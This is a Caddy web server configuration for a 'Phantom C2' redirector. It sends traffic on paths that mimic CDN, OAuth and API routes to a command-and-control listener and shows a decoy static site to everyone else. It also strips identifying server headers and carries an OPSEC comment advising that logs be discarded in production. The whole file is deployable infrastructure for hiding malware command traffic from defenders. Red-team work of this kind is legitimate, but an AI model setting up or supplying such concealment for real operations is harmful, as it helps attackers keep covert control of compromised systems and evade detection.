# Phantom C2 — Caddy Redirector (Docker deployment)
# Traffic shape: /api/v1/*, /api/v2/*, /cdn-cgi/*, /common/oauth2/*, /v1.0/*, /connect/*, /app/* -> Phantom C2 upstream
# Everything else -> static decoy site from ./site (served for the www domain only)

www.{$C2_DOMAIN} {
    # OPSEC: JSON logs for review; switch to `output discard` in production
    log {
        output stdout
        format json
    }

    # C2 profile paths -> forward to the Phantom listener
    # C2_UPSTREAM is optional in .env (defaults to the Docker host gateway)
    @c2 path /api/v1/* /api/v2/* /cdn-cgi/* /common/oauth2/* /v1.0/* /connect/* /app/*

    handle @c2 {
        reverse_proxy {$C2_UPSTREAM:172.17.0.1:8080} {
            header_up X-Real-IP {remote_host}
            transport http {
                read_timeout 120s
            }
        }
    }

    # Decoy: static site for everyone else
    handle {
        root * /srv
        file_server
    }

    # Strip backend/server headers + set a plausible security posture
    header {
        -Server
        -X-Powered-By
        X-Frame-Options "SAMEORIGIN"
        X-Content-Type-Options "nosniff"
        Referrer-Policy "no-referrer"
    }
}

# HTTP -> HTTPS redirect
http://www.{$C2_DOMAIN} {
    redir https://{host}{uri} permanent
}
